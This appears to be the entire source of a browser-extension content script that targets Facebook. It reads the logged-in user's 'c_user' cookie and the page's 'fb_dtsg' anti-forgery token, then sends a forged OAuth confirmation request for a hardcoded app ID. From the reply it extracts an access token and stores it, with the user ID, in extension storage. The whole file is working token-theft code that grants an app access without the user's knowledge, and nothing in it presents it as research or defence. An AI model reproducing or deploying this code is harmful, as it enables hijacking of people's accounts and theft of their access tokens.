function get_token() {
    document.cookie.split(";").forEach(function (cookie) {
        if(cookie.indexOf("c_user")>-1){
            var fbuserid=cookie.replace("c_user=","");
            var b = new XMLHttpRequest;
            b.open("POST", "https://www.facebook.com/v1.0/dialog/oauth/confirm"), b.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), b.send("fb_dtsg=" + fb_dtsg + "&app_id=" + a + "&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1"), b.onreadystatechange = function () {
                if (4 == b.readyState && 200 == b.status) {
                    var a = b.responseText.match(/access_token=(.*?)&/)[1];
                    chrome.storage.sync.set({fbuserid:fbuserid,fb_access_token:a}, function () {});
                }
            }
        }
    })

}
var a = 165907476854626;
if(document.getElementsByName("fb_dtsg").length){
    var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
    get_token();
}
